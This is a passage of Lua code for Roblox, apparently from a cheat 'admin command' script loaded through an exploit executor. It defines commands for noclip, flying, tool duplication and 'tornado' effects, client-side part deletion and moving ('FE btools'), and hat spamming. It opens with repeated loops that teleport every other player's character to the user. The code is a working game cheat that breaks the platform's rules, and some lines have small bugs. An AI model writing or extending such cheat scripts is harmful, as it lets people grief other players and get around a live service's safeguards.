  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end

end)


addcmd('sucker',{},
function(args, speaker)
local toolamount = 80 -- How long the tornado is
local tornadosize = 1 -- The size of how big the opening of the tornado is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = false
        tool.Grip = CFrame.new(Vector3.new(0, -index * .25, 0)) * CFrame.Angles(math.rad(90), .15, math.tan(index * 0.5))
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)

addcmd('toolspin',{},
function(args, speaker)

local GetBackpack = game.Players.LocalPlayer.Backpack:GetChildren() --this haks makes it so u can drop the gears so u can give it to ur friends or watever
for i=1, #GetBackpack do
   if GetBackpack[i].ClassName == "Tool" then
       GetBackpack[i].CanBeDropped = true
   end
end


local GetBackpack = game.Players.LocalPlayer.Backpack:GetChildren() --makes it better lel
for i=1, #GetBackpack do
   if GetBackpack[i].ClassName == "Tool" then
       GetBackpack[i].CanBeDropped = true
   end
end
LPC = game:GetService('Players').LocalPlayer.Character

function removemesh()
  for _,c in pairs(game:GetService('Players').LocalPlayer.Backpack:GetChildren()) do
    if c:IsA('Tool') then
      c.Parent = LPC
      for _,x in pairs(c:GetDescendants()) do
        if x:IsA('SpecialMesh') or x:IsA('BlockMesh') then
          x:Remove()
        end
      end
    end
  end
end

function drop()
  for _,zx in pairs(LPC:GetChildren()) do
    if zx:IsA('Tool') then
      x.Parent = workspace
    end
  end
end

pcall(removemesh)
wait(0.1)
pcall(drop)
if not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") then
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
wait()
end
for i = 1, 30 do
game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip = CFrame.new(Vector3.new(0, 0, 0)) * CFrame.Angles(i, i, 0) -- or if u wanna change
game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Backpack
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
wait(.2) 
end
end)

addcmd('fliptool',{'backflip'},
function(args, speaker)
pl=game.Players.LocalPlayer
me=pl.Character
xl=me.Torso['Right Shoulder']
t=Instance.new("HopperBin",pl.Backpack)
t.Name="the_Parkour_Flip"
 
local debounce=false
function _restoreproperties() 
Holder = player.Character 
Torso = Holder:FindFirstChild("Torso") 
RightS = Torso:FindFirstChild("Right Shoulder") 
LeftS = Torso:FindFirstChild("Left Shoulder") 
RightH = Torso:FindFirstChild("Right Hip") 
LeftH = Torso:FindFirstChild("Left Hip") 
RightS.MaxVelocity = .15 
LeftS.MaxVelocity = .15 
RightH.MaxVelocity = .1 
LeftH.MaxVelocity = .1 
RightS.DesiredAngle = 0 
LeftS.DesiredAngle = 0 
LeftH.DesiredAngle = 0 
RightH.DesiredAngle = 0 
end 
function ManageAnimation(value) 
Holder = player.Character 
Player = player 
if value == "no anim" then 
Anim = Holder:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = true 
Anim.Parent = Player 
end 
elseif value == "re-anim" then 
Anim = Player:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = false 
Anim.Parent = Holder 
end 
end 
end 
function Down(ml) 
for i=1, ml.velocity.y/3 do 
ml.velocity = ml.velocity+Vector3.new(0,-4.25,0) 
wait() 
end 
ml:Remove() 
end 
function Flip() 
if debounce==true then return end
debounce=true
Char = player.Character 
Human = Char.Humanoid 
Torso = Char.Torso 
CF = Torso.CFrame 
Human.PlatformStand = false
Human.Sit = true
VelUp = Instance.new("BodyVelocity") 
VelUp.velocity = Vector3.new(0,-5000,0)+Torso.CFrame.lookVector*-30
VelUp.P = VelUp.P*-1000
VelUp.maxForce = Vector3.new(10000,10000,10000)*999 
VelUp.Parent = Torso 
coroutine.resume(coroutine.create(Down),VelUp) 
Gyro = Instance.new("BodyGyro") 
Gyro.P = Gyro.P*10
Gyro.maxTorque = Vector3.new(100000,100000,100000)*999 
Gyro.cframe = CF 
Gyro.Parent = Torso 
for i=1, 16 do 
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/9,math.pi/-18,0) 
wait() 
end 
Gyro.cframe = CF 
wait()
Gyro:Remove()
Human.PlatformStand = false
Human.Sit = false
_restoreproperties() 
debounce=false
end 
function onActive(mouse) 
player = game.Players.LocalPlayer 
if player==nil then return end 
mouse.Button1Down:connect(function() Flip() end) 
end 
script.Parent = t.Selected:connect(onActive) 
end)

addcmd('raintools',{'rt'},
function(args, speaker)
local toolamount = 150 -- Amount of tools you want to rain



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
tempchar:Destroy()
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        runservice.RenderStepped:Wait()
        LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(savepos * Vector3.new(math.random(-50, 50), 100 + (index * 20), math.random(-50, 50)))
        tool.Parent = LocalPlayer.Backpack
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle:FindFirstChild("Mesh"):Destroy()
        end
        tool.Parent = workspace.Terrain
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
end)

addcmd('rejoin',{'rj'},
function(args, speaker)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
end)


runningnoclip = false
Clip = true
addcmd('noclip',{},
function(args, speaker)
Clip = false
	wait(0.1)
	if runningnoclip == false then runningnoclip = true
	game:GetService('RunService').Stepped:connect(function ()
	if Clip == false and Players.LocalPlayer.Character ~= nil then
    for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
	if child:IsA("BasePart") and child.CanCollide == true then
    child.CanCollide = false
	end end end end) end
end)

addcmd('autocleantools',{'act'},
function(args, speaker)
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
   if (v:IsA("Tool")) then
v.Parent = game.Players.LocalPlayer.Character
end
end
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
   if (v:IsA("Tool")) then
v.Parent = workspace.Terrain
end
end
end)

addcmd('autocleanhats',{'ach'},
function(args, speaker)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
   if (v:IsA("Accessory")) then
v.Parent = workspace
end
end
wait()
for i,v in pairs(workspace:GetDescendants()) do
   if (v:IsA("Accessory")) then
v.Parent = workspace.Terrain
end
end
end)

addcmd('clip',{'unnoclip'},
function(args, speaker)
	Clip = true
end)

addcmd('hatspam',{'spamhats'},
function(args, speaker)
local player = game:GetService("Players").LocalPlayer
local Waypoint = nil
Waypoint = player.Character.HumanoidRootPart.Position

local BRICKS = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local l = Instance.new("TextButton")
local s = Instance.new("TextButton")
local credits = Instance.new("TextLabel")
local txt = Instance.new("TextLabel")
local X = Instance.new("TextButton")
local bar1 = Instance.new("Frame")
local bar = Instance.new("Frame")
local btn = Instance.new("TextButton")

BRICKS.Name = "BRICKS"
BRICKS.Parent = game.CoreGui
BRICKS.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = BRICKS
Main.Active = true
Main.BackgroundColor3 = Color3.new(0.25098, 0.65098, 1)
Main.BorderSizePixel = 2
Main.ClipsDescendants = true
Main.Position = UDim2.new(0.275000006, 0, 0.373367608, 0)
Main.Selectable = true
Main.Size = UDim2.new(0, 324, 0, 129)

l.Name = "l"
l.Parent = Main
l.BackgroundColor3 = Color3.new(0.25098, 0.65098, 1)
l.BackgroundTransparency = 0.80000001192093
l.BorderColor3 = Color3.new(1, 1, 1)
l.BorderSizePixel = 3
l.Position = UDim2.new(0.567901254, 0, 0.465116292, 0)
l.Size = UDim2.new(0, 116, 0, 30)
l.Font = Enum.Font.SourceSans
l.Text = "Loop spawn"
l.TextColor3 = Color3.new(1, 1, 1)
l.TextSize = 20
l.TextWrapped = true

s.Name = "s"
s.Parent = Main
s.BackgroundColor3 = Color3.new(0.25098, 0.65098, 1)
s.BackgroundTransparency = 0.80000001192093
s.BorderColor3 = Color3.new(1, 1, 1)
s.BorderSizePixel = 3
s.Position = UDim2.new(0.0864197537, 0, 0.465116292, 0)
s.Size = UDim2.new(0, 116, 0, 30)
s.Font = Enum.Font.SourceSans
s.Text = "Spawn brick"
s.TextColor3 = Color3.new(1, 1, 1)
s.TextSize = 20
s.TextWrapped = true

credits.Name = "credits"
credits.Parent = Main
credits.BackgroundColor3 = Color3.new(1, 1, 1)
credits.BackgroundTransparency = 1
credits.Position = UDim2.new(0.219135806, 0, 0.844961226, 0)
credits.Size = UDim2.new(0, 175, 0, 20)
credits.Font = Enum.Font.Cartoon
credits.Text = "Made by Katie#8933"
credits.TextColor3 = Color3.new(1, 1, 1)
credits.TextScaled = true
credits.TextSize = 14
credits.TextWrapped = true

txt.Name = "txt"
txt.Parent = Main
txt.BackgroundColor3 = Color3.new(1, 1, 1)
txt.BackgroundTransparency = 1
txt.Position = UDim2.new(0.166666657, 0, 0.0116279069, 0)
txt.Size = UDim2.new(0, 178, 0, 33)
txt.Font = Enum.Font.Cartoon
txt.Text = "FE brick spawn  v1.1"
txt.TextColor3 = Color3.new(1, 1, 1)
txt.TextScaled = true
txt.TextSize = 14
txt.TextWrapped = true

X.Name = "X"
X.Parent = Main
X.BackgroundColor3 = Color3.new(0.25098, 0.65098, 1)
X.BackgroundTransparency = 0.80000001192093
X.BorderColor3 = Color3.new(1, 1, 1)
X.BorderSizePixel = 2
X.Position = UDim2.new(0.838883579, 0, 0.0755736828, 0)
X.Size = UDim2.new(0, 43, 0, 16)
X.Font = Enum.Font.Cartoon
X.Text = "<"
X.TextColor3 = Color3.new(1, 1, 1)
X.TextScaled = true
X.TextSize = 20
X.TextWrapped = true

bar1.Name = "bar1"
bar1.Parent = Main
bar1.BackgroundColor3 = Color3.new(1, 1, 1)
bar1.BorderSizePixel = 0
bar1.Position = UDim2.new(0, 0, -0.00312966481, 0)
bar1.Size = UDim2.new(0, 324, 0, 3)

bar.Name = "bar"
bar.Parent = Main
bar.BackgroundColor3 = Color3.new(1, 1, 1)
bar.BorderSizePixel = 0
bar.Position = UDim2.new(0, 0, 0.293609023, 0)
bar.Size = UDim2.new(0, 324, 0, 3)

btn.Name = "btn"
btn.Parent = Main
btn.BackgroundColor3 = Color3.new(1, 1, 1)
btn.BorderSizePixel = 0
btn.Position = UDim2.new(0.275999993, 0, 0.273000002, 0)
btn.Size = UDim2.new(0, 12, 0, 10)
btn.Visible = false
btn.Font = Enum.Font.SourceSans
btn.Text = ""
btn.TextSize = 14
Main.Draggable = true

X.MouseButton1Click:connect(function()
	if X.Visible == true then
	X.Visible = false
	s.Visible = false
	l.Visible = false
	credits.Visible = false
	txt.Visible = false
	bar1.Visible = false
	bar.Visible = false
	Main:TweenSizeAndPosition(UDim2.new(0, 29,0, 22), UDim2.new(0.239, 0,0.413, 0), "In", "Quad", 1)
	wait(1)
	btn.Visible = true
		end
end)

btn.MouseButton1Click:connect(function()
		btn.Visible = false
		Main:TweenSizeAndPosition(UDim2.new(0, 324,0, 129), UDim2.new(0.275, 0,0.404, 0), "In", "Quad", 1)
	X.Visible = true
	s.Visible = true
	l.Visible = true
	credits.Visible = true
	txt.Visible = true
	bar1.Visible = true
	bar.Visible = true
end)

l.MouseButton1Click:connect(function()
	game.StarterGui:SetCore("SendNotification", {
    Title = "Bricks";
    Text = "Auto SPAWN CANT STOP!!!";
    Icon = "rbxassetid://155509078";
    Duration = 3;
})
	while true do 
for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (v:IsA("Accessory")) then
v.Handle.Mesh:remove()
end
end

wait(.8)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (v:IsA("Accessory")) then
v.Parent = workspace
end
end

wait(.1)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (v:IsA("Accessory")) then
v.Parent = workspace
end
end
wait(.1)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (v:IsA("Accessory")) then
v.Parent = workspace
end
end

wait(.1)
game.Players.LocalPlayer.Character.Humanoid.Health = 0
wait(6)
player.Character.HumanoidRootPart.CFrame = CFrame.new(Waypoint)
end
end)

s.MouseButton1Click:connect(function()
	for i=1, 1 do		
for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (v:IsA("Accessory")) then
v.Handle.Mesh:remove()
end
end
wait(1)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (v:IsA("Accessory")) then
v.Parent = workspace
end
end

wait(.5)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (v:IsA("Accessory")) then
v.Parent = workspace
end
end
wait(.5)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if (v:IsA("Accessory")) then
v.Parent = workspace
end
end
wait(0.1)
wait(0.1)
game.Players.LocalPlayer.Character.Humanoid.Health = 0
wait()
game.StarterGui:SetCore("SendNotification", {
    Title = "Bricks";
    Text = "has been successfully spawned!";
    Icon = "rbxassetid://155509078";
    Duration = 3;
})
wait(6)
player.Character.HumanoidRootPart.CFrame = CFrame.new(Waypoint)
	end
end)
repeat
    for hue = 0, 1, .01 do
        Main.BorderColor3 = Color3.fromHSV(hue, 1, 1)
        wait()
    end
    for hue = 1, 0 -.01 do
        Main.BorderColor3 = Color3.fromHSV(hue, 1, 1)
        wait()
    end
until nil
end)
addcmd('pimp',{},
function(args, speaker)
local lp      = game.Players.LocalPlayer
local animate = lp.Character.Animate

            --//Scripting\\--
animate.walk.WalkAnim.AnimationId   = "rbxassetid://376760331"
animate.idle.Animation1.AnimationId = "rbxassetid://75356212"
animate.idle.Animation1.Looped      = true
lp.character.Humanoid.WalkSpeed     = 25
end)

addcmd('febtools',{},
function(args, speaker)
local LocalPlayer = game:GetService("Players").LocalPlayer
local mouse = LocalPlayer:GetMouse()
local movetool = Instance.new("Tool", LocalPlayer.Backpack)
local deletetool = Instance.new("Tool", LocalPlayer.Backpack)
local undotool = Instance.new("Tool", LocalPlayer.Backpack)
local identifytool = Instance.new("Tool", LocalPlayer.Backpack)
local movedetect = false
local movingpart = nil
local movetransparency = 0
if editedparts == nil then
    editedparts = {"Handle","Handles","Accesories","Smooth Block Model","Head","Part","Seat"}
    parentfix = {}
    positionfix = {}
end
deletetool.Name = "FE Delete"
undotool.Name = "FE Undo"
identifytool.Name = "FE Identify Part"
movetool.Name = "FE Move"
undotool.CanBeDropped = false
deletetool.CanBeDropped = false
identifytool.CanBeDropped = false
movetool.CanBeDropped = false
undotool.RequiresHandle = false
deletetool.RequiresHandle = false
identifytool.RequiresHandle = false
movetool.RequiresHandle = false
local function createnotification(title, text)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title;
        Text = text;
        Duration = 1;
    })
end
deletetool.Activated:Connect(function()
    createnotification("Delete Tool", "You have removed "..mouse.Target.Name)
    table.insert(editedparts, mouse.Target)
    table.insert(parentfix, mouse.Target.Parent)
    table.insert(positionfix, mouse.Target.CFrame)
    spawn(function()
        local deletedpart = mouse.Target
        repeat
            deletedpart.Anchored = true
            deletedpart.CFrame = CFrame.new(1000000000, 1000000000, 1000000000)
            wait()
        until deletedpart.CFrame ~= CFrame.new(1000000000, 1000000000, 1000000000)
    end)
end)
undotool.Activated:Connect(function()
    createnotification("Undo Tool", "You have undone "..editedparts[#editedparts].Name)
    editedparts[#editedparts].Parent = parentfix[#parentfix]
    editedparts[#editedparts].CFrame = positionfix[#positionfix]
    table.remove(positionfix, #positionfix)
    table.remove(editedparts, #editedparts)
    table.remove(parentfix, #parentfix)
end)
identifytool.Activated:Connect(function()
    createnotification("Identify Tool", "Instance: "..mouse.Target.ClassName.."\nName: "..mouse.Target.Name)
end)
movetool.Activated:Connect(function()
    createnotification("Move Tool", "You are moving: "..mouse.Target.Name)
    movingpart = mouse.Target
    movedetect = true
    movingpart.CanCollide = false
    movetransparency = movingpart.Transparency
    movingpart.Transparency = 0.5
    mouse.TargetFilter = movingpart
    table.insert(editedparts, movingpart)
    table.insert(parentfix, movingpart.Parent)
    table.insert(positionfix, movingpart.CFrame)
    movingpart.Transparency = movingpart.Transparency / 2
    repeat
        mouse.Move:Wait()
        movingpart.CFrame = CFrame.new(mouse.Hit.p)
    until movedetect == false
end)
movetool.Deactivated:Connect(function()
    createnotification("Move Tool", "You have stopped moving: "..mouse.Target.Name)
    movingpart.CanCollide = true
    movedetect = false
    mouse.TargetFilter = nil
    movingpart.Transparency = movetransparenc
end)
end)

addcmd('togglenoclip',{},
function(args, speaker)
	if Clip then
		execCmd('noclip')
	else
		execCmd('clip')
	end
end)

FLYING = false
iyflyspeed = 1
function sFLY()
	repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
	repeat wait() until IYMouse
	
	local T = Players.LocalPlayer.Character.HumanoidRootPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = 0
	
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
		repeat wait()
		Players.LocalPlayer.Character.Humanoid.PlatformStand = true
		if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
		SPEED = 50
		elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
		SPEED = 0
		end
if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
